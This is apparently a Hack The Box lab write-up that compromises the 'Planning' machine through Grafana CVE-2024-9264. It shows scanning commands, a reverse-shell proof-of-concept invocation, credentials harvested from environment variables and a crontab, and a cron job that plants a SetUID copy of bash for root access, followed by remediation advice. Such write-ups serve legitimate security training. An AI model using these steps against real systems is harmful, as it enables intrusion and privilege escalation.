# HTB Planning Machine Writeup

<img width="500" height="413" alt="image" src="https://github.com/user-attachments/assets/c0d4f5d0-a2a7-4581-9448-14b262d57ab6" />

## Machine Information

- **Target IP**: 10.10.11.68
- **Operating System**: Linux
- **Difficulty**: Medium
- **Initial Credentials**: admin / 0D5oT70Fq13EvB5r
- **Attack Vector**: CVE-2024-9264 Grafana RCE

## Executive Summary

This writeup documents the complete exploitation of the HTB Planning machine, which featured a vulnerable Grafana installation (v11.0.0) susceptible to CVE-2024-9264. The attack path involved subdomain enumeration to discover a Grafana instance, exploiting a remote code execution vulnerability to gain initial access as root, credential harvesting through environment variables, lateral movement via SSH, and privilege escalation through a vulnerable cron job scheduling system with SetUID binary manipulation.

## Initial Credentials

HTB provided the following initial credentials to simulate a real-world pentest scenario:

- **Username**: admin
- **Password**: 0D5oT70Fq13EvB5r

## Reconnaissance

### Port Scanning

Initial reconnaissance was performed using Nmap to identify open services on the target machine.

```bash
nmap -sS -p- -Pn -n --open --min-rate 5000 10.10.11.68
```

![Port Scan Results](images/Pasted%20image%2020250807171416.png)


**Open Ports Discovered**:

- Port 22 (SSH)
- Port 80 (HTTP)

### Service Enumeration

Detailed service analysis was conducted on the discovered open ports:

```bash
nmap -sCV -p22,80 -Pn -n 10.10.11.68
```

![Service Enumeration](images/Pasted%20image%2020250807171604.png)

**Key Findings**:

- **SSH Service**: OpenSSH running on port 22
- **HTTP Service**: Web server with virtual hosting
- **Virtual Host**: `planning.htb` domain identified

### Virtual Host Configuration

The target was using virtual hosting, requiring domain resolution configuration:

```bash
nano /etc/hosts
# Added: 10.10.11.68 planning.htb
```

### Web Application Analysis

Initial web application access revealed a standard website interface:

![Web Application Interface](images/Pasted%20image%2020250807172020.png)

Directory fuzzing attempts to locate admin panels or login pages yielded no significant results, prompting a shift to subdomain enumeration.

### Subdomain Discovery

Subdomain enumeration was performed to identify additional attack surfaces:

```bash
wfuzz -w /home/xon/Desktop/xon/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://planning.htb/ -H "Host: FUZZ.planning.htb" --hl 7
```

![Subdomain Discovery](images/Pasted%20image%2020250807172244.png)

**Subdomain Discovered**: `grafana.planning.htb`

After adding the subdomain to `/etc/hosts`, access was gained to a Grafana login interface:

![Grafana Login Interface](images/Pasted%20image%2020250807172410.png)

## Vulnerability Analysis

### Grafana Version Identification

The Grafana instance was identified as version 11.0.0, which is vulnerable to CVE-2024-9264.

**Vulnerability Details**:

- **CVE ID**: CVE-2024-9264
- **Impact**: Remote Code Execution
- **Affected Versions**: Grafana >= v11.0.0 (all v11.x.y versions)
- **Root Cause**: Insufficient input sanitization in SQL Expressions feature

### CVE-2024-9264 Research

Research revealed a public exploit for this vulnerability:

- **Repository**: https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
- **Requirements**: Authenticated Grafana user with Viewer permissions or higher
- **Dependencies**: DuckDB binary accessible through Grafana's PATH

**Vulnerability Description**: The exploit leverages insufficient input sanitization in Grafana's SQL Expressions feature, allowing arbitrary shell command execution through the shellfs community extension.

## Initial Access

### CVE-2024-9264 Exploitation

The vulnerability was exploited using the public proof-of-concept:

**Usage**:

```bash
python3 poc.py [--url <target>] [--username <username>] [--password <password>] [--reverse-ip <IP>] [--reverse-port <PORT>]
```

**Successful Exploitation**:

![CVE Exploitation Success](images/Pasted%20image%2020250807173031.png)

The exploitation resulted in immediate root access to the system, demonstrating the critical nature of this vulnerability.

### Credential Discovery

During the initial enumeration as root, the linpeas.sh script was executed to identify potential privilege escalation vectors and system misconfigurations.

**Environment Variable Discovery**:

![Credential Discovery](images/Pasted%20image%2020250807173411.png)

**Credentials Found**:

- **Username**: enzo
- **Password**: RioTecRANDEntANT!

## Lateral Movement

### SSH Access

Using the discovered credentials, SSH access was established for the user 'enzo':

```bash
ssh enzo@planning.htb
```

![SSH Access](images/Pasted%20image%2020250807173616.png)

**Achievement**: User flag obtained (`user.txt`)

### System Enumeration

Further enumeration using linpeas.sh revealed additional system information and potential privilege escalation vectors.

**Custom Crontab Discovery**:

![Crontab Discovery](images/Pasted%20image%2020250807173832.png)

**Critical Finding**: `/opt/crontabs/crontab.db` - A custom crontab configuration file

### Crontab Analysis

Examination of the custom crontab file revealed scheduled tasks:

```bash
cat /opt/crontabs/crontab.db
```

![Crontab Content](images/Pasted%20image%2020250807174302.png)

**Scheduled Tasks Identified**:

1. **Daily Backup Job**: Archives Docker image `root_grafana` with password `P4ssw0rdS0pRi0T3c`
2. **Cleanup Job**: Executes `/root/scripts/cleanup.sh` every minute as root

### Network Service Discovery

Network enumeration revealed internal services not exposed externally:

![Network Services](images/Pasted%20image%2020250807174517.png)

**Internal Service**: Port 8000 running locally

### SSH Port Forwarding

To access the internal service, SSH local port forwarding was established:

```bash
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
```

This allowed access to `http://localhost:8000` from the attacker machine.

## Privilege Escalation

### Crontab Management Interface

Access to the internal service revealed a cron job management interface:

![Cron Management Interface](images/Pasted%20image%2020250807174747.png)

**Authentication**: Successfully logged in using username `root` and password `P4ssw0rdS0pRi0T3c` (extracted from crontab.db)

### Malicious Job Creation

A malicious cron job was created to establish persistence and privilege escalation:

**Job Title**: revshell **Command**:

```bash
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
```

**Job Scheduling**: Set to execute every minute using the time expression `1 ****`

![Malicious Job Creation](images/Pasted%20image%2020250807175011.png)

**Attack Strategy**:

1. Copy the bash binary to `/tmp/bash`
2. Apply SetUID bit (`chmod u+s`) to allow execution with root privileges
3. Execute the SetUID binary to gain root shell

### SetUID Binary Exploitation

After the cron job executed, verification was performed:

![SetUID Binary Verification](images/Pasted%20image%2020250807175143.png)

**Verification Steps**:

1. Confirmed presence of `/tmp/bash` binary
2. Verified SetUID permissions were applied
3. Executed the binary with preserved privileges

### Root Access Achievement

The SetUID binary was executed to gain root privileges:

```bash
/tmp/bash -p
```

![Root Access Achieved](images/Pasted%20image%2020250807175349.png)

**The `-p` flag preserves the privileged UID, resulting in root access.**

### Root Flag Capture

With root access achieved, the final flag was located and captured:

![Root Flag](images/Pasted%20image%2020250807175452.png)

**Root flag location**: `/root/root.txt`

## Technical Analysis

### Vulnerability Chain

The successful compromise involved a chain of vulnerabilities and misconfigurations:

1. **CVE-2024-9264**: Critical RCE in Grafana v11.0.0
2. **Credential Exposure**: Environment variables containing user credentials
3. **Insecure Cron Management**: Web-based cron management with weak authentication
4. **SetUID Exploitation**: Ability to create SetUID binaries through cron jobs

### Security Impact Assessment

**Impact Severity**: Critical

**Business Impact**:

- Complete system compromise
- Unauthorized access to sensitive data
- Potential for lateral movement within the network
- Risk of persistent backdoor installation

### Attack Vector Analysis

**Primary Attack Vector**: Web Application Vulnerability (CVE-2024-9264) **Secondary Vectors**:

- Credential harvesting
- Insecure cron job management
- SetUID binary manipulation

## Remediation Recommendations

### Immediate Actions

1. **Update Grafana**: Upgrade to the latest patched version (>= v11.1.0)
2. **Credential Management**: Remove hardcoded credentials from environment variables
3. **Cron Security**: Implement proper authentication and authorization for cron management
4. **SetUID Auditing**: Review and restrict SetUID binary creation capabilities

### Long-term Security Improvements

1. **Vulnerability Management**: Implement regular security assessments and patch management
2. **Access Controls**: Implement least privilege principles for all system accounts
3. **Network Segmentation**: Isolate critical services and implement proper network controls
4. **Monitoring**: Deploy comprehensive logging and monitoring for privileged operations

### Development Security Practices

1. **Secure Configuration**: Avoid default credentials and implement secure configuration baselines
2. **Input Validation**: Implement proper input sanitization for all user-controlled data
3. **Security Testing**: Include security testing in the development lifecycle
4. **Code Review**: Implement security-focused code review processes

## Lessons Learned

1. **Critical Vulnerabilities**: Even recent software versions can contain critical vulnerabilities
2. **Defense in Depth**: Multiple security layers could have prevented or limited the attack
3. **Credential Security**: Proper credential management is essential for system security
4. **Privilege Escalation**: Misconfigured system services can provide easy privilege escalation paths

## Conclusion

The HTB Planning machine demonstrated a realistic attack scenario combining a critical application vulnerability (CVE-2024-9264) with system misconfigurations. The attack path showcased how initial access through a web application vulnerability can lead to complete system compromise through credential harvesting and privilege escalation.

This exercise highlights the importance of maintaining up-to-date software, implementing secure configuration practices, and deploying comprehensive security controls to prevent and detect such attacks. The machine served as an excellent example of how multiple security weaknesses can be chained together to achieve full system compromise.
